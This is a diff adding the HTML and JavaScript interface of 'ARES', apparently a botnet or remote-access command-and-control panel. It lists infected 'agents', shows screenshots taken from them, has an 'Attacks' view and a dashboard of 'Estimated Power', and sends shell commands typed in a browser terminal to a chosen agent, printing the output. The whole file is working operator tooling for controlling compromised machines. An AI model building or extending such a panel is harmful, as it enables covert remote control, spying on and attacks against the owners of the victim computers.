@@ -1,0 +1,448 @@
+<!DOCTYPE html>
+
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="google" content="notranslate">
+<meta http-equiv="Content-Language" content="en">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
+<link rel="stylesheet" href="https://code.getmdl.io/1.3.0/material.indigo-pink.min.css">
+<script defer src="https://code.getmdl.io/1.3.0/material.min.js"></script>
+<link rel="stylesheet" href="css/xterm.css" />
+<link rel="stylesheet" href="codeMirror/lib/codemirror.css">
+<link rel="stylesheet" href="codeMirror/theme/seti.css">
+<script src="codeMirror/lib/codemirror.js"></script>
+<script src="codeMirror/mode/javascript/javascript.js"></script>
+<script src="js/xterm.js"></script>
+<script src="js/xterm_fit.js"></script>
+<script src="js/dialog.js"></script>
+<link rel="stylesheet" href="css/dialog.css">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/2.1.1/socket.io.js"></script>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script src="js/utils.js"></script>
+<script src="js/connection.js"></script>
+<link rel="stylesheet" href="css/style.css">
+</head>
+<!-- Always shows a header, even in smaller screens. -->
+<div class="mdl-layout mdl-js-layout mdl-layout--fixed-header">
+  <header class="mdl-layout__header">
+    <div class="mdl-layout__header-row">
+      <!-- Title -->
+      <span class="mdl-layout-title" id="title"></span>
+      <div class="header-img"></div>
+
+      <!-- Add spacer, to align navigation to the right -->
+      <div class="mdl-layout-spacer"></div>
+      <!-- Navigation. We hide it in small screens. -->
+ 
+    </div>
+  </header>
+  <div class="mdl-layout__drawer">
+    <span class="mdl-layout-title">ARES</span>
+    <nav class="mdl-navigation">
+      <a class="mdl-navigation__link" onclick="showDashboard()"><i class="mdl-color-text--blue-grey-400 material-icons" role="presentation">dashboard</i>Dashboard</a>
+      <a class="mdl-navigation__link" onclick="showAgents()"><i class="mdl-color-text--blue-grey-400 material-icons" role="presentation">dns</i>Agents</a>
+      <a class="mdl-navigation__link" onclick="showAttacks()"><i class="mdl-color-text--blue-grey-400 material-icons">memory</i>Attacks</a>
+      <a class="mdl-navigation__link" onclick="showScreenshots()"><i class="mdl-color-text--blue-grey-400 material-icons" role="presentation">camera_alt</i>Screenshots</a>
+      <a class="mdl-navigation__link" onclick="openSettings()"><i class="mdl-color-text--blue-grey-400 material-icons" role="presentation">settings</i>Settings</a>
+    </nav>
+  </div>
+  <main class="mdl-layout__content">
+    <div class="dialog hide"></div>
+    <div class="page-content">
+      <div class="dashboard-view" id="dashboard-view">
+          <div class="content-grid mdl-grid">
+              <div class="mdl-cell">
+                  <div class="demo-card-square mdl-card mdl-shadow--2dp" onclick="showAgents()">
+                      <div class="mdl-card__title mdl-card--expand">
+                        <h2 class="mdl-card__title-text">Agent Count</h2>
+                      </div>
+                      <div class="mdl-card__supporting-text">
+                        <center><h1 id="dashboard-agent-count"></h1></center>
+                      </div>
+
+                    </div>
+              </div>
+              <div class="mdl-cell">
+                  <div class="demo-card-square mdl-card mdl-shadow--2dp">
+                      <div class="mdl-card__title mdl-card--expand">
+                        <h2 class="mdl-card__title-text">Estimated Power</h2>
+                      </div>
+                      <div class="mdl-card__supporting-text">
+                        <center><h1>10gbs</h1><center>
+                      </div>
+
+                    </div>
+              </div>
+              <div class="mdl-cell">
+                  <div class="demo-card-square mdl-card mdl-shadow--2dp">
+                      <div class="mdl-card__title mdl-card--expand">
+                        <h2 class="mdl-card__title-text">Uptime</h2>
+                      </div>
+                      <div class="mdl-card__supporting-text">
+                        <center><h1 id="dashboard-uptime"></h1></center>
+                      </div>
+
+                    </div>
+              </div>
+            </div>
+      </div>
+      <!-- end of dashboard view -->
+      <div id="screenshots-view" class="screenshots-view">
+        <div id="screenshot-grid" class="content-grid mdl-grid">
+        </div>
+      </div>
+      <!-- end of screenshot view -->
+      <div id="attacks-view" class="attacks-view">
+      </div>
+      <!-- end of attacks view -->
+
+
+      <div class="agent-view" id="agent-view">
+        <div class="agent-list-table-container">
+          <table class="mdl-data-table agent-list-table mdl-js-data-table  mdl-shadow--2dp">
+            <thead>
+              <tr>
+                <th class="mdl-data-table__cell--non-numeric">Agent Name</th>
+                <th>Uptime</th>
+                <th>More</th>
+              </tr>
+            </thead>
+            <tbody id="agent-view-table-body" class="agent-view-table-body">
+            </tbody>
+          </table>
+      </div>
+      </div>
+      <!-- end of agent view-->
+      <div id="agent-terminal-view" class="agent-terminal-view">
+          <div class="agent-terminal-view-toolbar" id="agent-terminal-view-toolbar">
+              <button class="mdl-button mdl-js-button mdl-button--raised mdl-js-ripple-effect mdl-button--accent back-button "><i class="material-icons" role="presentation">arrow_back</i></button>
+          </div>
+          <div class="terminal-container" id="terminal-container">
+
+          </div>
+      </div>
+      <!-- end of agent terminal view-->
+
+
+
+    </div>
+  </main>
+</div>
+
+</html>
+
+<script>
+
+/*
+ █████╗ ██████╗ ███████╗███████╗
+██╔══██╗██╔══██╗██╔════╝██╔════╝
+███████║██████╔╝█████╗  ███████╗
+██╔══██║██╔══██╗██╔══╝  ╚════██║
+██║  ██║██║  ██║███████╗███████║
+╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝
+                                
+
+version 1.3_11-19-18
+
+NEED TO MAKE MORE ASYNC
+*/
+
+var views = ['agent-view', 'dashboard-view','attacks-view','screenshots-view', 'settings-view', 'resources-view', 'agent-terminal-view','new-post-view', 'post-view']
+let uptime = 0;
+var editors = [];
+//var myCodeMirror;
+let commandBuffer = [];
+let selectedAgent = '';
+//createCodeEditor('codeDump','//right your script or dump text here')
+
+
+  Terminal.applyAddon(fit);
+  var term = new Terminal();
+  term.open(document.getElementById('terminal-container'));
+//here we are gonna add the client side functionality like showing information and other stuff
+$(document).ready(function(){
+  hideAllViews();
+  uid = getCookie('uid')
+  checkUserExist(uid).then(results => {
+    if(results == true){
+      console.log("%cAUTHENTICATED", 'background: black; color:green;padding:3px;font-weight: bold')
+      showDashboard()
+    }else{
+      window.location = "/error.html"
+    }
+  })
+})
+
+
+
+
+socket.on('screenshotFileName',function(file){
+    $('#screenshot-grid').append('<div class="mdl-cell"><div class="demo-card-image mdl-card mdl-shadow--2dp" style="background:url(screenshots/'+file+');background-size:cover;" ><div class="mdl-card__title mdl-card--expand"></div><div class="mdl-card__actions"><span class="demo-card-image__filename"><p>'+file+'<p></span></div></div></div>');
+})
+socket.on('newAgent',function(agentName){
+  showView('#agent-view');
+  $('#agent-view-table-body').append('<tr onclick="openAgentCMD(\'' + agentName + '\')"><td class="mdl-data-table__cell--non-numeric">'+agentName+'</td><td>25</td><td><button id="menu1" class="mdl-button mdl-js-button mdl-button--icon"><i class="material-icons">more_vert</i></button></td></tr>')
+})
+socket.on('addTcpAgent', function(socketID){
+  $('#agent-view-table-body').append('<tr onclick="openAgentCMD(\'' + socketID + '\')"><td class="mdl-data-table__cell--non-numeric">'+socketID+'</td><td>25</td><td><button id="menu1" class="mdl-button mdl-js-button mdl-button--icon"><i class="material-icons">more_vert</i></button></td></tr>')
+})
+
+setTimeout(function() {
+          componentHandler.upgradeDom('MaterialCheckbox');
+}, 0)
+
+
+//--- view handler scripts ---//
+
+function updateTitle(title){
+  $('#title').text(title);
+}
+
+function hideAllViews(){
+  views.forEach(view => {
+    $('#'+view).removeClass('show')
+    $('#'+view).addClass('hide')
+  });
+}
+
+function showAttacks(){
+  updateTitle('Attacks')
+  hideAllViews();
+}
+
+function openSettings(){
+  updateTitle('Settings')
+  hideAllViews();
+}
+
+function openResources(){
+  uid = getCookie('uid')
+  checkUserExist(uid).then(results => {
+    if(results == true){
+      updateTitle('Resources')
+      showView('#resources-view')
+      $('#post-view').empty()
+      getResourcesPosts(uid)
+
+    }else{
+      window.location = "/error.html"
+    }
+  })
+}
+function showScreenshots(){
+  updateTitle('Screenshots')
+  showView('#screenshots-view')
+  socket.emit('loadScreenshots')
+}
+function showNewPostView(){
+  uid = getCookie('uid')
+  checkUserExist(uid).then(results => {
+    if(results == true){
+      updateTitle('New Post')
+      showView('#new-post-view')
+    }else{
+      window.location = "/error.html"
+    }
+  })
+}
+
+function showView(what){
+  hideAllViews()
+  $(what).removeClass('hide')
+  $(what).addClass('show')
+}
+function hideView(what){
+  $(what).removeClass('show')
+  $(what).addClass('hide')
+}
+function showDashboard(){
+  var uid = getCookie('uid')
+  updateTitle('Dashboard')
+  showView('#dashboard-view');
+  getAgents(uid).then(results => {
+    $('#dashboard-agent-count').text(results.length)
+    console.log(results.length)
+  })
+  //update uptime from the actual server just in case
+  getUptime(uid).then(result => {
+    uptime = result;
+    console.log(result)
+    $('#dashboard-uptime').text(formatTime(result));
+  })
+
+}
+function showAgents(){
+  updateTitle('Agents')
+  console.log("%cShowAgents", 'color:#0077ee; background:black;padding:3px;')
+  uid = getCookie('uid')
+  checkUserExist(uid).then(results => {
+    if(results == true){
+      showView('#agent-view');
+      $('#agent-view-table-body').empty();
+      getAgents(uid).then(results => {
+        results.forEach(result => {
+          $('#agent-view-table-body').append('<tr onclick="openAgentCMD(\'' + result.agentName + '\')"><td class="mdl-data-table__cell--non-numeric">'+result.agentName+'</td><td>25</td><td><button id="menu1" class="mdl-button mdl-js-button mdl-button--icon"><i class="material-icons">more_vert</i></button></td></tr>')
+        });
+      })
+    }else{
+      window.location = "/error.html"
+    }
+  })
+}
+
+function showCMDview(){
+  updateTitle(selectedAgent)
+  term.reset()
+  term.prompt = () => {
+    term.write('\r\n$ ');
+  };
+  term.focus()
+  console.log('show cmd view')
+  showView('#agent-terminal-view');
+}
+function openAgentCMD(agentName){
+  selectedAgent = agentName;
+  showCMDview()
+  $('#command-text-field').focus();
+  term.fit()
+  socket.emit('selectAgent', agentName)
+  term.prompt()
+}
+
+
+//add terminal key event handler
+  term._core.register(term.addDisposableListener('key', (key, ev) => {
+    const printable = !ev.altKey && !ev.altGraphKey && !ev.ctrlKey && !ev.metaKey;
+    commandBuffer.push(key);
+
+    if (ev.keyCode === 13) {
+      let keysEntered = commandBuffer.join('')
+      console.log(selectedAgent)
+      console.log(keysEntered)
+      socket.emit('sendCmd', keysEntered, selectedAgent)
+      //clear the buffer
+      keysEntered = undefined;
+      commandBuffer = [];
+      term.prompt();
+    } else if (ev.keyCode === 8) {
+     // Do not delete the prompt
+      commandBuffer.pop()
+      term.write('\b\b')
+      if (term.x > 2) {
+        term.write('\b \b');
+      }
+    } else if (printable) {
+      term.write(key);
+    }
+  }));
+
+    term._core.register(term.addDisposableListener('paste', (data, ev) => {
+    term.write(data);
+  }));
+
+term.on('lineFeed', function() {
+  let keysEntered = commandBuffer.join('');  // Or something like that
+  console.log(keysEntered)
+  commandBuffer = [];  // Empty buffer
+});
+
+
+//updates uptime counter on dashboard-view
+setInterval(function() {
+    uptime ++;
+    $('#dashboard-uptime').text(formatTime(uptime))
+}, 1000)
+
+
+
+//scripts for handling code editor
+
+function createCodeEditor(id, data){
+  console.log(id)
+  editorName = id
+  editors[editorName] = CodeMirror.fromTextArea((document.getElementById(id)),{
+    theme:'seti',
+    mode:  'javascript',
+    styleActiveLine: true,
+    matchBrackets: true,
+    continuousScanning: 500,
+    lineNumbers:true,
+    autofocus:true
+});
+//editors[editorName].refresh();
+editors[editorName].getDoc().setValue(data);
+  setTimeout(function(){
+    editors[editorName].refresh();
+  }, 1);
+}
+
+
+
+
+
+//handle stdout data from server
+
+socket.on('stdoutData',function(data){
+  term.writeln(data)
+})
+
+
+
+
+
+//--- login and AUTH scripts --//
+
+function trylogin(){
+  var username = document.getElementById('username').value
+  var password = document.getElementById('password').value
+  socket.emit('checkLogin',username,password)
+}
+socket.on('loginTrue', function(){
+  console.log('yeet')
+})
+function checkUserExist(uid){
+  console.log('check user exist')
+  "use strict"
+    return new Promise(resolve => {
+        socket.emit('checkUserExist',uid, function(returnData){
+            console.log('userExist =', returnData)
+            resolve(returnData);
+        });
+    });
+}
+
+
+//--- get Stats scripts ---//
+
+function getAgents(uid){
+  "use strict"
+    return new Promise(resolve => {
+        socket.emit('getAgents',uid, function(returnData){
+            resolve(returnData);
+        });
+    });
+}
+function getUptime(uid){
+  "use strict"
+    return new Promise(resolve => {
+        socket.emit('getUptime',uid, function(returnData){
+            resolve(returnData);
+        });
+    });
+}
+function getUidInfo(uid){
+  "use strict"
+  return new Promise(resolve => { 
+    socket.emit('getUidInfo', uid, function(returnData){
+      resolve(returnData);
+    });
+  });
+}
+function getResourcesPosts(uid){
+  $('#resources-feed').empty()
+  socket.emit('getResourcesPosts',uid)
+}
+
+</script>
